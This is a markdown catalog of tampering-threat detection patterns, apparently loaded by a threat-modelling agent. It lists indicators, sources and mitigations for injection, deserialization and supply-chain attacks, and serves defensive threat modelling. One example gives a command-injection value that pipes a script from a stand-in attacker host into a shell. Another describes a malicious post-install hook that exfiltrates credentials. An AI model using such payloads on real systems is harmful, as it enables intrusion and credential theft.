---
name: tampering-detection-patterns
description: Externalized detection pattern catalog for STRIDE tampering — input injection, data flow manipulation, persistent data corruption, code/config tampering, supply chain integrity
consumers: [tachi-tampering]
last_updated: 2026-04-11
---

# Tampering Detection Patterns

## Overview

Detection vocabulary for the STRIDE Tampering threat category. Loaded at detection start by `tachi-tampering` agent via a single `**MANDATORY**: Read` directive.

## Targeted DFD Element Types

- **Process**: Application servers, business logic services, build pipelines, deployment processes, data transformation services
- **Data Store**: Databases, file systems, object storage, caches, message queues, configuration stores
- **Data Flow**: API requests/responses, inter-service communication, file transfers, message bus traffic, webhook payloads

## Input Injection

- SQL injection via unsanitized user input reaching database queries
- Command injection through user-controlled values passed to system shells
- LDAP, XPath, or NoSQL injection in query construction
- Server-side template injection (SSTI) in rendering engines
- Missing parameterized queries or prepared statements

## Data Flow Manipulation

- Man-in-the-middle opportunities on unencrypted channels
- Missing integrity checks (HMAC, digital signatures) on inter-service messages
- Unsigned webhook payloads accepted without verification
- API responses modifiable by network-level attackers (no TLS)
- Missing content integrity validation on file downloads or updates

## Persistent Data Corruption

- Direct database access without application-layer authorization
- Missing write-audit trails on sensitive data modifications
- Bulk update endpoints without row-level authorization checks
- Missing optimistic concurrency controls enabling silent overwrites
- Database backups stored without integrity verification (checksums)

## Code and Configuration Tampering

- Unsigned deployment artifacts (containers, packages, binaries)
- Missing integrity checks on CI/CD pipeline outputs
- Configuration files modifiable by unauthorized processes
- Environment variable injection through unvalidated sources
- Dependency confusion or supply chain substitution attacks

## API Parameter Manipulation

- Mass assignment or object injection via unfiltered request body fields
- Type coercion attacks (string to integer, array to object) bypassing validation
- Hidden or undocumented API parameters accepted without allowlist enforcement
- Parameter pollution (duplicate keys with conflicting values) exploiting parser differences
- Price, quantity, or privilege fields modifiable by client-side request tampering

## Cross-Site Request Forgery

- State-changing operations accepting requests without CSRF tokens
- Missing SameSite cookie attributes on session cookies
- API endpoints relying solely on cookie-based authentication without additional verification

## Pattern Category 7: Deserialization Gadget Chains

Untrusted object deserialization is a distinct class of tampering that string-level injection patterns do not catch. This category detects architectures where a Process accepts serialized objects (Java `ObjectInputStream`, Python `pickle`/`cloudpickle`, Ruby `Marshal`, .NET `BinaryFormatter`, PHP `unserialize`, YAML unsafe loaders) from an untrusted trust zone, enabling gadget-chain remote code execution without any injection vector in source code.

**Indicators**:

- DFD element accepts serialized object bytes from an untrusted source (HTTP body, message queue, file upload, cache read, cookie) and routes them to a deserialization call
- Architecture declares use of Java `ObjectInputStream` / `readObject` on cross-trust-boundary input without an ObjectInputFilter allowlist
- Python `pickle.loads` / `cloudpickle.loads` on data sourced from anywhere other than a fully trusted internal store
- Jackson with default typing enabled (`enableDefaultTyping`) on JSON input from external callers
- YAML loader used without the safe/typed variant (`yaml.load` instead of `yaml.safe_load`; SnakeYAML without `SafeConstructor`)
- XStream used without the XStream security framework denylist/allowlist configured
- Cache or queue stores polymorphic serialized objects that a reader deserializes with runtime type inference
- PHP `unserialize` on session data or cookie content that a client can influence

**Primary source**:

- CWE-502: Deserialization of Untrusted Data: https://cwe.mitre.org/data/definitions/502.html
- OWASP Top 10 2021 A08: Software and Data Integrity Failures: https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/
- OWASP Deserialization Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html

**Example**: A workflow-orchestration service accepts user-defined task definitions as Python pickle bytes from an HTTP POST endpoint. Input validation checks size and MIME type but not contents. An attacker submits a crafted pickle payload that, on `loads()`, triggers a gadget chain using classes already on the classpath (`os.system`, `subprocess.Popen` via `__reduce__`). Remote code execution occurs inside the orchestrator process with its full privileges — including database write and IAM role — without any injection vulnerability in the orchestrator's own source code.

**Mitigation**:

- Replace native serialization with explicit typed formats (JSON schema, Protocol Buffers, Avro) at every trust boundary; ban cross-boundary `pickle`/`ObjectInputStream`/`Marshal`/`unserialize` outright
- Where native serialization cannot be removed (legacy caches), constrain it with allowlisted class filters (Java `ObjectInputFilter`, Python `pickle.Unpickler.find_class` override)
- Pin serialization formats to the safe variants (`yaml.safe_load`, Jackson without default typing, XStream with `XStream.setupDefaultSecurity`)
- Treat any serialized object crossing a trust boundary as executable code for threat-modeling purposes; subject its source to the same controls as code pulled from an external registry

## Pattern Category 8: Software Supply Chain Integrity Failures

Modern applications pull code, models, and container layers from public registries at build and runtime. This category detects build/deploy pipelines and runtime Processes that fetch dependencies from external registries without lockfile verification, signature validation, or attestation — creating opportunities for dependency confusion, typosquatting, and registry-takeover attacks to inject tampered code into production before any application input is even accepted.

**Indicators**:

- Build pipeline pulls from public registries (npm, PyPI, crates.io, HuggingFace, Maven Central, DockerHub) without a committed lockfile covering all transitive dependencies
- No sigstore / SLSA / in-toto attestation verification on downloaded artifacts
- Container base images referenced by tag only (e.g., `python:3.11`) rather than by digest (`python:3.11@sha256:...`)
- Application performs ad-hoc dependency installation at runtime (`pip install`, `npm install`, `apt-get install` in a live container) rather than baking dependencies into the image at build time
- Package resolution spans mixed public/private registries with ambiguous precedence — classic dependency-confusion surface
- Private package names do not reserve placeholder stubs on public registries (enables typosquatting to grab an unregistered public name)
- ML model weights fetched from HuggingFace or similar without SHA-256 digest pinning or signature verification
- No hash verification step between artifact fetch and runtime load

**Primary source**:

- MITRE ATT&CK T1195: Supply Chain Compromise: https://attack.mitre.org/techniques/T1195/
- MITRE ATT&CK T1195.001: Compromise Software Dependencies and Development Tools: https://attack.mitre.org/techniques/T1195/001/
- MITRE ATT&CK T1195.002: Compromise Software Supply Chain: https://attack.mitre.org/techniques/T1195/002/
- OWASP Top 10 2021 A08: Software and Data Integrity Failures: https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/
- CWE-494: Download of Code Without Integrity Check: https://cwe.mitre.org/data/definitions/494.html

**Example**: A data-pipeline service installs a Python package named `internal-analytics-utils` from a requirements.txt with no lockfile. The name is intended to resolve against an internal PyPI mirror, but the `pip` index order lists public PyPI first. An attacker registers a same-named package on public PyPI with a higher version number and a post-install hook that reads environment variables and POSTs them to an attacker endpoint. Next build pulls the malicious package, the CI runner's IAM session token and database connection string exfiltrate to the attacker, and the tampered code then ships to production.

**Mitigation**:

- Commit and verify hash-pinned lockfiles (`package-lock.json`, `poetry.lock`, `Cargo.lock`, `requirements.txt --hash`) on every dependency installation step
- Configure package manager to prefer the private registry unconditionally and to fail closed on unknown packages; reserve private package names as placeholder stubs on every public registry the manager consults
- Pin container base images by digest, not by tag; re-verify the digest on every build
- Adopt SLSA build provenance and sigstore attestation verification for first-party artifacts; require attestation on any dependency flagged critical by the software bill of materials
- Bake dependencies into the container image at build time; treat runtime `pip install` / `npm install` as a blocking security finding

## Pattern Category 9: Injection Attacks Beyond SQL

Existing patterns call out SQL injection but under-cover the broader injection family that OWASP A03:2021 unified. This category detects OS command injection, LDAP injection, NoSQL injection, expression-language injection, and server-side template injection across Processes that construct queries or commands by string concatenation from untrusted input — a common finding in microservice and serverless architectures that use LDAP directories, MongoDB/DynamoDB, and template engines for user-customizable output.

**Indicators**:

- Process constructs OS shell commands via string concatenation from external input (`subprocess.run(..., shell=True)`, `os.system`, `exec`, backticks in Ruby/Perl)
- LDAP filter construction uses untrusted input without `escapeFilter()` or parameterized bind (`(&(uid=` + user_input + `))`)
- MongoDB queries built from raw request body dictionaries without operator-key allowlist (enables `$where`, `$regex` injection)
- DynamoDB `FilterExpression` or `ConditionExpression` built by string concatenation rather than placeholders
- Server-side template engines (Jinja2, Velocity, FreeMarker, Handlebars, Thymeleaf) rendering user-controllable template source — not just user-controllable data within a fixed template
- Expression-language processors (Spring SpEL, JSTL EL, OGNL) evaluating strings that contain user input
- XPath or XQuery construction by string concatenation on user input against XML data stores
- SMTP / LDAP / HTTP header construction by string concatenation (header-injection surface)

**Primary source**:

- OWASP Top 10 2021 A03: Injection: https://owasp.org/Top10/A03_2021-Injection/
- CWE-78: OS Command Injection: https://cwe.mitre.org/data/definitions/78.html
- CWE-90: LDAP Injection: https://cwe.mitre.org/data/definitions/90.html
- CWE-943: Improper Neutralization of Special Elements in Data Query Logic (NoSQL): https://cwe.mitre.org/data/definitions/943.html
- CWE-917: Expression Language Injection: https://cwe.mitre.org/data/definitions/917.html
- OWASP Command Injection Defense Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html

**Example**: A file-conversion microservice accepts an uploaded document and a "target format" string, then shells out to a converter CLI via `subprocess.run(f"convert --to {fmt} {path}", shell=True)`. The `fmt` field is validated as non-empty but not constrained to an allowlist. An attacker submits `fmt="pdf; curl attacker.example/s | sh"`. The shell parses the semicolon, invokes the attacker-supplied command with the converter's execution-role credentials, and the attacker obtains persistent reverse shell access to the microservice container.

**Mitigation**:

- Replace shell invocations with argument-list process APIs (`subprocess.run([..., fmt, path], shell=False)`); disallow `shell=True` on any input-derived command
- Use parameterized client libraries for every data store — prepared statements for SQL, typed query builders for MongoDB/DynamoDB, `LdapName`/`escapeFilter` for LDAP
- Treat template source as code: user input is template data, never template source; sandbox template engines that must accept user templates (e.g., Jinja2 `SandboxedEnvironment`)
- Strip newline and null bytes from any value used to construct SMTP, LDAP, or HTTP headers; prefer header-builder APIs that enforce this

## Primary Sources

- OWASP Top 10 2021 — A03: Injection
- OWASP Top 10 2021 — A08: Software and Data Integrity Failures
- OWASP API Security Top 10 2023 — API3: Broken Object Property Level Authorization
- OWASP Input Validation Cheat Sheet
- OWASP SQL Injection Prevention Cheat Sheet
- OWASP Cross-Site Request Forgery Prevention Cheat Sheet
- CWE-20: Improper Input Validation
- CWE-89: SQL Injection
- CWE-345: Insufficient Verification of Data Authenticity
- CWE-352: Cross-Site Request Forgery
- CWE-494: Download of Code Without Integrity Check
- MITRE ATT&CK T1565: Data Manipulation
- MITRE ATT&CK T1195: Supply Chain Compromise
- NIST SP 800-53 SI-7: Software, Firmware, and Information Integrity
- CWE-502 Deserialization of Untrusted Data: https://cwe.mitre.org/data/definitions/502.html
- OWASP Top 10 2021 A08 (canonical URL): https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/
- OWASP Deserialization Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
- MITRE ATT&CK T1195 Supply Chain Compromise: https://attack.mitre.org/techniques/T1195/
- MITRE ATT&CK T1195.001 Compromise Software Dependencies and Development Tools: https://attack.mitre.org/techniques/T1195/001/
- MITRE ATT&CK T1195.002 Compromise Software Supply Chain: https://attack.mitre.org/techniques/T1195/002/
- CWE-494 Download of Code Without Integrity Check (canonical URL): https://cwe.mitre.org/data/definitions/494.html
- OWASP Top 10 2021 A03 (canonical URL): https://owasp.org/Top10/A03_2021-Injection/
- CWE-78 OS Command Injection: https://cwe.mitre.org/data/definitions/78.html
- CWE-90 LDAP Injection: https://cwe.mitre.org/data/definitions/90.html
- CWE-943 NoSQL Query Logic Injection: https://cwe.mitre.org/data/definitions/943.html
- CWE-917 Expression Language Injection: https://cwe.mitre.org/data/definitions/917.html
- OWASP Command Injection Defense Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
